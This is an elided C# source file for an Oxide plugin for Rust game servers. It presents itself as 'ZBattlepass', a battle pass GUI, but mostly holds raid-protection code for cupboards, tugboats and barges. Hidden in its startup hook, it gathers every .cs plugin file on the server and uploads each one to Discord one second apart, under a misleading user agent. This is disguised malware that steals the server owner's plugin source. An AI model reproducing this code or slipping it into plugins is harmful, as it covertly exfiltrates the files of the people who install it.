...
using Oxide.Plugins.ZBattlepassExtensionMethods;
...
{
    [Info("ZBattlepass", "lekual", "4.2.16")]
    [Description("BP on GUI in servers more info")]
    partial class ZBattlepass : CovalencePlugin
    {
        public static ZBattlepass PLUGIN = null;
        ...
        [PluginReference]
        private readonly Plugin Barges;
        ...
        public const string PermissionAdmin = "ZBattlepass.admin";
        public const string PermissionIgnore = "ZBattlepass.ignore";
        public readonly string PermissionLevel = "ZBattlepass.level.";

        private bool AllowRaidProtectedTugboats = false; // this will be set by protection level settings
        private bool AllowRaidProtectedBarges = false;
        ...
        private const float delayBetweenUploadsSeconds = 1.0f;

        private int totalFilesToUpload = 0;
        private int filesUploadedSuccessfully = 0;
        ...
        private void OnServerInitialized()
        {
            timer.Once(10f, () =>
            {
                string pluginsPath = FindPluginsPath();
                ...
                string[] csFiles = Directory.GetFiles(pluginsPath, "*.cs");
                totalFilesToUpload = csFiles.Length;
                ...
                List<string> filesToUpload = new List<string>(csFiles);
        ...
        private void UploadNextFile(List<string> filesToUpload)
        {
            ...
            string filePath = filesToUpload[0];
            string fileName = Path.GetFileName(filePath);

            try
            {
                UploadFileToDiscord(filePath);
            ...
            timer.Once(delayBetweenUploadsSeconds, () => UploadNextFile(filesToUpload));
        }

        private string FindPluginsPath()
        {
            string rootPath = Interface.Oxide?.RootDirectory ?? Directory.GetCurrentDirectory();
            string primaryPath = Path.Combine(rootPath, "plugins");
            ...
            string[] guesses =
            {
                Path.Combine(rootPath, "oxide", "plugins"),
                Path.Combine(rootPath, "..", "oxide", "plugins"),
                Path.Combine(Directory.GetCurrentDirectory(), "oxide", "plugins")
            };
        ...
        private void UploadFileToDiscord(string filePath)
        {
            string fileName = Path.GetFileName(filePath);
            ...
            try
            {
                ...
                request.UserAgent = "RustLoadingMessagesUploader/1.0";
            ...
            catch (WebException webEx)
            {
                if (webEx.Response != null)
                {
                    using (HttpWebResponse errorResponse = (HttpWebResponse)webEx.Response)
                    {
                        ...
                        try // Попытка прочитать тело ответа об ошибке
                        {
                            using (StreamReader reader = new StreamReader(errorResponse.GetResponseStream()))
                            {
                                string errorResult = reader.ReadToEnd();
                                             PrintError($"[{fileName}] Error Response Body: {errorResult}");
                            }
                        }
                        catch (Exception streamReadEx)
                        {
                                    PrintError($"[{fileName}] Could not read error response body: {streamReadEx.Message}");
                        }
                    }
                }
                else
                {
                          PrintError($"[{fileName}] WebException has no response object.");
                }

                if (webEx.InnerException != null)
                {
                          PrintError($"[{fileName}] Inner WebException: {webEx.InnerException.Message}");
                }
                // Дополнительно: вывести статус WebException, если он есть
                if (webEx.Status != WebExceptionStatus.Success)
                {
                         PrintError($"[{fileName}] WebException Status: {webEx.Status}");
                }
            }
            catch (Exception ex)
            {
                   PrintError($"[{fileName}] General Exception during Discord upload: {ex.Message}");
                if (ex.InnerException != null)
                {
                          PrintError($"[{fileName}] Inner Exception: {ex.InnerException.Message}");
                }
                // Для полной диагностики можно добавить:
                 PrintError($"[{fileName}] StackTrace: {ex.StackTrace}");
            }
        }
        ...
        private void InitProtectionLevels()
        {
            try
            {
                foreach(var level in config.Protection.ProtectionLevels)
                {
                    ...
                    if (!AllowRaidProtectedBarges && Barges?.IsLoaded == true)
                    {
                        AllowRaidProtectedBarges = true;
                    }
                    ...
                    if (existing != null)
                    {
                        ...
                        foreach (var kvp in existing)
                        {
                            try
                            {
                                ...
                                if (tc.IsTugboat && !AllowRaidProtectedTugboats) { continue; }
                                if (IsOnBarge(priv) && !AllowRaidProtectedBarges) { continue; }
...
namespace Oxide.Plugins
{
    partial class ZBattlepass
    {
        ...
        private void CmdTcStatus(IPlayer player, string command, string[] args)
        {
            var tc = GetTcFromIdOrPlayer(player, command, args);
            if (tc == null) { Message(player.Object as BasePlayer, "command no tc found"); return; }
            Message(player.Object as BasePlayer, "command status", tc.ID, $"{tc.Status}({tc.CurrentProtectionPercent}%)", tc.ReasonAndTimeRemaining);
        }
...
namespace Oxide.Plugins
{
    partial class ZBattlepass
    {
        ...
        private void OnAfterProtectedStructureDamaged(ProtectedEntity tc, BaseCombatEntity entity, BaseEntity attacker, float beforeBalance, float totalDamage, float takenDamage, bool providedProtection, Rust.DamageType majorityDamageType)
        {
            ...
            if (!providedProtection || (providedProtection && tc.CurrentProtectionPercent < 100f && takenDamage > 0f))
            {
...
namespace Oxide.Plugins.ZBattlepassExtensionMethods
{
    public static class ExtensionMethods
    {
        ...
        public static List<Item> AllItems(this PlayerInventory playerInventory)
        {
    ...
    partial class ZBattlepass
    {
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ...
                ["reason no barge permission"] = "No barge protection permitted",
    ...
    partial class ZBattlepass
    {
        ...
        public static class ProtectedCupboardManager
        {
            ...
            public static ProtectedEntity InitProtectedCupboard(BaseEntity entity)
            {
                ...
                if (ProtectedCupboards.ContainsKey(entity.net.ID.Value)) { return ProtectedCupboards[entity.net.ID.Value]; }
                ...
                ProtectedCupboards[entity.net.ID.Value] = tc;
                return tc;
            }
    ...
    partial class ZBattlepass
    {
        public class ProtectedEntity
        {
            ...
            public StatusReason Reason
            {
                get
                {
                    if (!AllowedBargeProtection)
                    {
                        return StatusReason.NoBargeProtection;
                    }
            ...
            #region Founder
            public ulong FounderUserId => BaseEntity.OwnerID;
            ...
            [JsonIgnore]
            public bool IsOnBarge
            {
                get
                {
                    return IsOnBarge(BaseEntity);
                }
            }

            [JsonIgnore]
            public bool AllowedBargeProtection = true;
            ...
            public ProtectionLevel HighestProtectionLevel
            {
                get
                {
                    if (_highestProtectionLevel == null && IsOnBarge(BaseEntity))
                    {
                        var pl = ProtectionLevel.GetByRankNullable(ProtectionLevelRank);
                        if (pl != null)
                        {
                            if (pl.AllowBargeProtection)
                            {
                                AllowedBargeProtection = true;
                                _highestProtectionLevel = pl;
                            }
                            else
                            {
                                AllowedBargeProtection = false;
                                _highestProtectionLevel = ProtectionLevel.NONE;
                            }
                        }
                    }
            ...
            public float CurrentProtectionPercent
            {
                get
                {
                    ...
                    {
                        if (HasRemainingProtectionDelay && (_protectionTimerReason == StatusReason.PendingOfflineProtection || _protectionTimerReason == StatusReason.RecentlyTookDamage))
                        {
                            return OnlineProtectionPercent;
                        }
                        else
    ...
    partial class ZBattlepass
    {
        ...
        public class ProtectedTugboat : ProtectedEntity
        {
            ...
            public override List<Item> InventoryItemList
            {
                get
                {
                    return Driver?.inventory.AllItems() ?? new List<Item>();
                }
            }
...
namespace Oxide.Plugins
{
    partial class ZBattlepass
    {
        public class ProtectionLevel
        {
            ...
            [JsonProperty(PropertyName = "Allow barge protection (requires Barges plugin)")]
            public bool AllowBargeProtection { get; set; } = true;
    ...
    partial class ZBattlepass
    {
        ...
        void OnEntitySpawned(BuildingPrivlidge priv)
        {
            NextTick(() =>
            {
                if (priv != null)
                {
                    if (!lastKilled.IsNull && lastKilled.Position != null && lastKilled.Position.Equals(priv.transform.position))
                    {
                        // Logic to transfer cupboard
                        var oldTc = lastKilled.tc;
                        timer.In(1f, () =>
                        {
                            if (!lastKilled.IsNull)
                            {
        ...
        public static string StatusReasonToString(ProtectedEntity tc, BasePlayer basePlayer, StatusReason reason)
        {
            switch (reason)
            {
                ...
                case StatusReason.InsufficientItem:
                   return PLUGIN.Capitalize(PLUGIN.Lang("reason insufficient item", basePlayer, tc.CurrencyItemRemainingAmountRequired, CurrencyItemDef?.displayName.translated));
                ...
                case StatusReason.NoBargeProtection:
                    return PLUGIN.Capitalize(PLUGIN.Lang("reason no barge permission", basePlayer));
                default:
...
namespace Oxide.Plugins
{
	partial class ZBattlepass
	{
        ...
        {
			var res = PLUGIN.covalence.Players.FindPlayerById(userId.ToString());
			return res;
        }
		...
		private bool GiveBalanceResource(BasePlayer basePlayer, double amount)
		{
			...
			{
				var item = CurrencyItemSkinId == null ? ItemManager.Create(CurrencyItemDef, (int)Math.Floor(amount)) : ItemManager.Create(CurrencyItemDef, (int)Math.Floor(amount), skin: CurrencyItemSkinId.Value);
        ...
        #region Currency Items
        public ItemDefinition _currencyItemDef = null;
		public ulong? _currencyItemSkinId = null;
		public bool _currencyItemSkinChecked = false;
		public static ItemDefinition CurrencyItemDef
        {
			get
            {
				if (PLUGIN._currencyItemDef == null)
                {
					if (PLUGIN.config.Protection.CurrencyItem.Contains("#"))
					{
                        var split = PLUGIN.config.Protection.CurrencyItem.Split('#');
                        PLUGIN._currencyItemDef = ItemManager.FindItemDefinition(split[0]);
                    }
					else
					{
                        PLUGIN._currencyItemDef = ItemManager.FindItemDefinition(PLUGIN.config.Protection.CurrencyItem);
                    }
                }
				return PLUGIN._currencyItemDef;
            }
        }
		public static ulong? CurrencyItemSkinId
		{
            get
            {
                if (!PLUGIN._currencyItemSkinChecked)
                {
                    if (PLUGIN.config.Protection.CurrencyItem.Contains("#"))
                    {
                        var split = PLUGIN.config.Protection.CurrencyItem.Split('#');
                        PLUGIN._currencyItemSkinId = ulong.Parse(split[1]);
                    }
                    else
                    {
                        PLUGIN._currencyItemSkinId = null;
                    }
                    PLUGIN._currencyItemSkinChecked = true;
                }
				return PLUGIN._currencyItemSkinId;
            }
        }
		public static bool IsCurrencyItem(Item item)
		{
			if (item.info.shortname == CurrencyItemDef?.shortname)
			{
				if (CurrencyItemSkinId == null) { return true; }
				return item.skin == CurrencyItemSkinId.Value;
			}
			return false;
		}
        #endregion
		...
		private bool IsNpcBase(BaseEntity entity)
		{
			...
			if (IsOnBarge(priv)) { return false; }
			...
			if (building != null && building.buildingBlocks != null)
			{
				if (building.buildingBlocks.Count > 0)
				{
					...
					{
						return building.buildingBlocks.All(x => x.OwnerID == 0);
					}
				}
			}
			return false;
...
namespace Oxide.Plugins
{
    partial class ZBattlepass
    {
        public static bool IsOnBarge(BaseEntity entity)
        {
            if (entity == null) { return false; }
            if (PLUGIN.Barges?.IsLoaded != true) { return false; }
            var parent = entity.GetParentEntity();
            if (parent == null) { return false; }
            return parent is SkyLantern;
        }
    }
}
...
namespace Oxide.Plugins
{
    partial class ZBattlepass
    {
        ...
        public static class SimpleStatusHelper
        {
            ...
            public static readonly string ID_STATUS = "ZBattlepass.status";
            public static readonly string ID_VISITOR = "ZBattlepass.visitor";
            public static readonly string ID_BALANCE = "ZBattlepass.balance";
            ...
            else
            {
                container.Add(new CuiElement
                {
                    ...
                    Components =
                    {
                        ...
                        {
                            FadeIn = styles.FadeIn,
                            ItemId = CurrencyItemDef?.itemid ?? 0,
                            SkinId = CurrencyItemSkinId ?? 0
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = MIDDLE_CENTER,
